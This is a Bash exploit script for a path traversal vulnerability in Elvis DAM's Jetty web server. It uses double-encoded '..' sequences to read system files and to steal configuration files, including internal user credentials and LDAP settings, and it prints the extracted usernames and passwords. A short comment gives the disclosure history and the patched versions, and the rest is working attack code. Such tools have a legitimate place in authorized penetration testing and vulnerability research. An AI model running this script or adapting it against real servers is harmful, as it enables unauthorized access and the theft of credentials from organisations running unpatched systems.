#!/bin/bash
# Said Ramirez Hernandez
# ElvisDAM-DT.sh
# 20th April 2020
: <<'COMMENT'
A vulnerability in Elvis DAM was discovered and reported to WoodWing Software in May 2018.
Jetty web server used by some versions of Elvis DAM is vulnerable to path traversal attacks.
PathResource class introduced in Jetty 9.3.X (CVE-2016-4800) can be bypassed by requesting malicious URLs containing specific escaped characters.

A video with the proof of concept of this vulnerability is avalilable at https://www.youtube.com/watch?v=PWcRfdQ3R2I

WoodWing Software released a fix for this vulnerability in the following versions:
    6.14.2
    5.27.8
    4.6.29

This vulnerability was successfully tested on versions and platforms:

CentOS/RHEL	5.27.6.206 GA
		5.27.2.260 GA
macOS           5.11.3.2 GA
                5.27.6.206 GA
		5.19.1.154 GA
Windows	        5.22.2.197 GA
		5.11.5.1 QP2

This script will try to determine if Elvis DAM is vulnerable or not. If it is vulnerable, critical configuration files will be retrieved and saved for its manual review.
COMMENT

####### BGN VARS
URL=$2
SLASH=`echo "${URL: -1}"`
if [ $SLASH == '/' ] 2> /dev/null; then
	URL=`echo "${URL/%\//}"`
else
	:
fi
PLATFORM=$4
BASE_PATH="/plugins/plugin_base/web.shared/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e"
INTERNAL_USERS_FILE="internal-users.properties.txt"
LDAP_CONFIG_FILE="ldap-config.properties.txt"
CLUSTER_CONFIG_FILE="cluster-config.properties.txt"
NODE_CONFIG_FILE="node-config.properties.txt"
TARGET=`echo "$URL" | awk -F '/' '{print $3}'`
OUTPUT_FOLDER="ElvisDAM-$TARGET"
ABSOLUTE_PATH=`pwd`
####### END VARS

####### BGN FUNCTIONS
function VERSION {
    echo -e "\033[1;38mDetermining Elvis DAM version\033[0m"
	ELVIS_VERSION=`curl -sk $URL/services/welcome | grep -Eo '\"version\":"([0-9]{1,3}.){3}[0-9]{1,3}\"' | grep -Eo [0-9.]+`
    echo -e "\033[1;34m$ELVIS_VERSION\033[0m"
}

function USAGE {
	echo -e "\033[1;38mElvisDAM.sh\033[0m"
	echo -e "\033[1;34mVersion 1.0\033[0m\033[1;38m by \033[0m\033[1;31mSaid Ramirez Hernandez\n\033[0m"
	echo -e "\033[1;34mUsage:\033[0m"
    echo -e "\033[1;38m\t-u, --url\tElvis DAM URL\033[0m \033[1;31m(Mandatory)\033[0m"
    echo -e "\033[1;38m\t-p, --platform\t<windows | linux | macos>\033[0m"
    echo -e "\033[1;34m\nNotes:\033[0m\n\t\033[1;38mIf argument <-p | --platform> is not specified, the script will try to determine if target is vulnerable or not\033[0m"
    echo -e "\033[1;34m\nExamples:\033[0m"
    echo -e "\033[1;38m\tbash ElvisDAM.sh -u https://elvis-dam-windows/\033[0m"
    echo -e "\033[1;38m\tbash ElvisDAM.sh --url https://elvis-dam-macos -p macos\033[0m"
	exit 1
}

function CHECK_PLATFORM_VULNERABLE {
for _ in once; do
	echo -e "\033[1;31mNo platform specified\033[0m"
	VERSION
	echo -e "\033[1;38mTrying with platform Windows and file /Windows/win.ini\033[0m"
	if curl -sk -o /dev/null -w "%{http_code}" $URL$BASE_PATH/Windows/win.ini | grep 200 > /dev/null; then
		echo -e "\033[1;34mPlatform \033[0m\033[1;31mWindows\033[0m\033[1;34m is vulnerable! Go ahead and run the script specifying the platform :D\033[0m"
	break
	else
		:
	fi
	echo -e "\033[1;38mTrying with platform Linux and file /etc/issue\033[0m"
	if curl -sk -o /dev/null -w "%{http_code}" $URL$BASE_PATH/etc/issue | grep 200 > /dev/null; then
		echo -e "\033[1;34mPlatform \033[0m\033[1;31mLinux\033[0m\033[1;34m is vulnerable! Go ahead and run the script specifying the platform :D\033[0m"
	break
	else
		:
	fi
	echo -e "\033[1;38mTrying with platform macOS and file /System/Library/CoreServices/SystemVersion.plist\033[0m"
	if curl -sk -o /dev/null -w "%{http_code}" $URL$BASE_PATH/System/Library/CoreServices/SystemVersion.plist | grep 200 > /dev/null; then	
		echo -e "\033[1;34mPlatform \033[0m\033[1;31mmacOS\033[0m\033[1;34m is vulnerable! Go ahead and run the script specifying the platform :D\033[0m"
	else
		echo -e "\033[1;34mIt seems the target is not vulnerable :c ... Pobody's nerfect \033[0m"	
	fi
done
}

function RETRIEVE_FILES {
    VERSION
    if curl -sk -o /dev/null -w "%{http_code}" "$URL$BASE_PATH$CONFIG_DIR$INTERNAL_USERS_FILE" | grep 200 > /dev/null; then
        echo -e "\033[1;38mExtracting usernames and passwords for Elvis DAM\033[0m"
        curl -sk "$URL$BASE_PATH$CONFIG_DIR$INTERNAL_USERS_FILE" | grep -E '^[A-Za-z.]+.=.*.,' | awk -F '=' '{print "user:"$1 " password:" $2}' | awk -F ',' '{print "\033[1;34m" $1 "\033[0m"}'
        mkdir $OUTPUT_FOLDER > /dev/null 2>&1
        if [ $? -eq 0 ]; then
            curl -sk "$URL$BASE_PATH$CONFIG_DIR$INTERNAL_USERS_FILE" -o $OUTPUT_FOLDER/$INTERNAL_USERS_FILE
            curl -sk "$URL$BASE_PATH$CONFIG_DIR$LDAP_CONFIG_FILE" -o $OUTPUT_FOLDER/$LDAP_CONFIG_FILE
            curl -sk "$URL$BASE_PATH$CONFIG_DIR$CLUSTER_CONFIG_FILE" -o $OUTPUT_FOLDER/$CLUSTER_CONFIG_FILE
            curl -sk "$URL$BASE_PATH$CONFIG_DIR$NODE_CONFIG_FILE" -o $OUTPUT_FOLDER/$NODE_CONFIG_FILE
            echo -e "\033[1;31mPlease check the files saved in\033[0m\033[1;34m '$ABSOLUTE_PATH/$OUTPUT_FOLDER'\033[0m\033[1;31m for additional information\033[0m"
            echo -e "\033[1;38mBye! :)\033[0m"
        else
            echo -e "\033[1;31mYou don't have permissions to create folder '$ABSOLUTE_PATH/$OUTPUT_FOLDER' :c ... Pobody's nerfect\033[0m"
            exit 1
        fi
    else
        echo -e "\033[1;31mIt seems the target is not vulnerable or the configuration path is not in the default location.\nPlease do a manual inspection ... Pobody's nerfect\033[0m"
    fi
}
####### END FUNCTIONS

####### BGN MAIN
shopt -s nocasematch
# Check if the ammount of arguments is equals to 2 or 4
if [[ "$#" -eq 2 || "$#" -eq 4 ]]; then
	:
else
	USAGE
fi
# If the platform is not specified, it will try to determine it and check if it is vulnerable
if [ "$#" -eq 2 ]; then
	if [[ $1 == "-u" || $1 == "--url" && $2 != "" ]]; then
		CHECK_PLATFORM_VULNERABLE
	else
		USAGE 
	fi
fi
# If platform is specified, assign its respectively config directory and retrieve configuration files
if [ "$#" -eq 4 ]; then
	if [[ $1 == "-u" || $1 == "--url" && $3 == "-p" || $3 == "--platform" && $2 != "" && $4 != "" ]]; then  
        if [[ $PLATFORM == "windows" ]]; then
            CONFIG_DIR="/ProgramData/Elvis%20Server/Config/"
            RETRIEVE_FILES
        elif [[ $PLATFORM == "linux" ]]; then
            CONFIG_DIR="/srv/elvis-server/app/config/"
            RETRIEVE_FILES
        elif [[ $PLATFORM == "macos" ]]; then
            CONFIG_DIR="/Library/Elvis%20Server/Config/"
            RETRIEVE_FILES
        else
            echo -e "\033[1;31mPlatform $4 is unknown :s ... Pobody's nerfect\033[0m"
            USAGE
        fi
    else
		USAGE
	fi
fi
####### END MAIN
